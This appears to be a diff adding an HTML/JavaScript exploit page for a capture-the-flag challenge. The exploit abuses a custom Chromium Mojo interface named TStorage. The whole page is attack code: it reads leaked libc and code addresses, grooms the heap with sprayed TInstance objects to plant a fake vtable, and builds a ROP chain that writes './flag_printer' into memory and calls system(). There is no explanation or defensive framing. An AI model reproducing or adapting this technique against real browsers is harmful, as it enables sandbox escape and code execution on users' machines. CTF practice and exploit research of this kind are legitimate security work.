@@ -1,0 +1,167 @@
+<html>
+	<pre id='log'></pre>
+	<script src="mojojs/mojo_bindings.js"></script>
+	<script src="mojojs/third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>
+<script>
+
+function print(msg) {
+    console.log(msg);
+    document.body.innerText += msg + '\n'; 
+}
+
+function print_value(msg, value) {
+    console.log(msg+hex(value));
+    document.body.innerText += msg + hex(value) + '\n'; 
+}
+
+function hex(i){
+	return '0x'+i.toString(16);
+}
+
+function debug(){
+    for(let i = 0; i < 0x100000; i++){
+        for(let j = 0; j < 0x100000; j++){
+            var x = x + i + j;
+        }
+    }
+}
+
+print("[+] Start");
+
+async function pwn(){
+
+	// Create TStorage
+	var ts_ptr = new blink.mojom.TStoragePtr();
+	Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(ts_ptr).handle);
+	await ts_ptr.init();
+	// now we can createInstance
+	var ti_ptr = (await ts_ptr.createInstance()).instance;
+
+	// get libc leak and .text leak
+	var libc_leak = (await ts_ptr.getLibcAddress()).addr;
+	print_value("[+] Libc leak: ", libc_leak);
+	var text_leak = (await ts_ptr.getTextAddress()).addr;
+	print_value("[+] Text leak: ", text_leak);
+	var libc_base = libc_leak-0x40730;
+	print_value("[+] Libc base: ", libc_base);
+	var system = libc_base+0x4f4e0;
+	var malloc_hook = libc_base+0x3ebc30;
+	var free_hok = libc_base+0x3ed8e8;
+
+	var text_base = text_leak-0x39b5e60;
+	print_value("[+] code base: ", text_base);
+	var bss = text_leak+0x6ec6fe0;
+	print_value("[+] Target bss: ", bss);
+
+	var xchg = text_base+0x7fde8e4;
+	print_value("[+] xchg gadget: ", xchg);
+
+	A = []; // many many TInstance (inner_db_)
+	B = []; // many many TStorage (inner_db_ptr_)
+	C = []; // also many many TInstance for heap spray
+
+	var list_size = 10;
+
+	for(let i = 0; i < list_size; i++){
+		B.push(null); // init B[i]
+		B[i] = new blink.mojom.TStoragePtr();
+		Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(B[i]).handle);
+		await B[i].init();
+		A.push((await B[i].createInstance()).instance);
+	}
+
+	for(var i = 0; i < list_size; i++){
+		var tmp_ts_ptr = new blink.mojom.TStoragePtr();
+		Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(tmp_ts_ptr).handle);
+		await tmp_ts_ptr.init();
+		C.push((await tmp_ts_ptr.createInstance()).instance);
+	}
+
+	// reset TStorage->inner_db_ptr_ in B[]
+	for(var i = 0; i < list_size; i++){
+		await B[i].init();
+	}
+
+	print("[+] Prepaired for heap spray");
+
+	for(var idx = 0; idx < list_size; idx++){
+		for(var i = 0; i < 200; i++){
+			C[idx].set(i, 0x1000+i);
+		}
+		for(var i = 0; i < 79-1; i++){
+			await C[idx].push(0x10000+i);
+		} // capacity = 79
+		for(var i = 0; i < 39; i++){
+			await C[idx].pop();
+		} // capacity = 49
+		for(var i = 0; i < 76-40; i++){
+			await C[idx].push(0x20000+i);
+		} // capacity = 76
+		for(var i = 0; i < 38; i++){
+			await C[idx].pop();
+		} // capacity = 47
+		for(var i = 0; i < 51; i++){
+			if(i != 8){
+				await C[idx].push(0x30000+i);
+			}
+			else{
+				await C[idx].push(bss); // vtable entry
+			}
+		} // capacity = 89
+		for(var i = 0; i < 45; i++){
+			await C[idx].pop();
+		} // capacity = 56
+		for(var i = 0; i < 163-5; i++){
+			await C[idx].push(0x40000+i);
+		}
+		await C[idx].push(bss-8);        // buffer_
+		await C[idx].push(0xcf);         // capacity_
+		await C[idx].push(0);            // index_
+		await C[idx].push(1);            // end_
+		await C[idx].push(0x74747474);   // int_value_
+	}
+
+	print("[+] Heap spray finished");
+
+	var binsh = libc_base+0x1b40fa;
+	var pop_rdi_ret = text_base+0x2e9ee1d;
+	var ret = text_base+0x2d3eac9;
+	var pop_rax_ret = text_base+0x2d815fc;
+	var mov_rdi_al_pop_rbp_ret = text_base+0x527c945;
+	for(var idx = 0; idx < list_size; idx++){
+		var temp = (await A[idx].getInt()).value;
+		if(temp == 0x74747474){
+			print_value("[+] Find target: ", idx);
+			var target = A[idx];
+			await target.push(ret);
+			await target.push(pop_rdi_ret); // passing xchg gadget
+			await target.push(xchg);
+			var cmd = './flag_printer\x00';
+			var cmd_buf = bss+0x500;
+			for(var cmd_idx = 0; cmd_idx < cmd.length; cmd_idx++){
+				await target.push(pop_rdi_ret);
+				await target.push(cmd_buf+cmd_idx); // address
+				await target.push(pop_rax_ret);
+				await target.push(cmd.charCodeAt(cmd_idx));
+				await target.push(mov_rdi_al_pop_rbp_ret); // cmd[idx]
+				await target.push(0x21212121); // fake rbp
+			}
+
+			// system(cmd)
+			await target.push(pop_rdi_ret);
+			// await target.push(binsh);
+			await target.push(cmd_buf);
+			await target.push(ret);
+			await target.push(system);
+			print("[+] Trigger!");
+			//debug();
+			await target.getTotalSize();
+		}
+	}
+}
+
+
+pwn();
+
+</script>
+</html>
